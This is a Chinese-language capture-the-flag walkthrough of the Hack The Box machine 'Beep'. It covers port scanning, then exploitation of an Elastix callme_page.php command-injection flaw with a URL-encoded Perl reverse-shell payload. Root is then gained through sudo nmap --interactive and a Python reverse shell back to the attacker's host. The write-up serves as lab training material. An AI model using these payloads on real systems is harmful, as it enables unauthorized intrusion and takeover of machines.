# beep

## 信息收集

```
nmap -vv -sV -sT -T 4 10.129.1.226
```

```
PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?      syn-ack
80/tcp    open  http       syn-ack Apache httpd 2.2.3
110/tcp   open  pop3?      syn-ack
111/tcp   open  rpcbind    syn-ack 2 (RPC #100000)
143/tcp   open  imap?      syn-ack
443/tcp   open  ssl/https? syn-ack
993/tcp   open  imaps?     syn-ack
995/tcp   open  pop3s?     syn-ack
3306/tcp  open  mysql?     syn-ack
4445/tcp  open  upnotifyp? syn-ack
10000/tcp open  http       syn-ack MiniServ 1.570 (Webmin httpd)
Service Info: Host: 127.0.0.1
```

访问80端口，会被重定向到443端口，使用了低版本的TLS协议。在火狐里输入about:config,搜索tls.version,将tls最小的支持版本改为TLS V1

![image-20230503002320882](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230503002320882.png)

后续就可以无视风险正常访问了:laughing:

![image-20230502172812207](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230502172812207.png)

## 漏洞利用

这里查询了一下elastix的漏洞

```shell
searchsploit elastix
```

有个RCE,贴上exp

```
https://10.129.1.226/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.9%3a1234%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A
```

这里需要注意，必须按照payload的格式对一些特殊符号url编码，第一次利用的时候url decode成明文，发现并没有收到shell。

拿到shell后利用python创建个交互式终端

```
python -c 'import pty; pty.spawn ("/bin/bash")'
```

## 权限提升

```
sudo -l
```

这里卡住了，查了下可以利用nmap的---interactive提权

```
sudo nmap --interactive
nmap> !python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.9',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
┌──(root💀Chinchin)-[/usr/…/modules/exploits/unix/http]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.16.9] from (UNKNOWN) [10.129.1.226] 33372
bash: no job control in this shell
bash-3.2# whoami
root

```


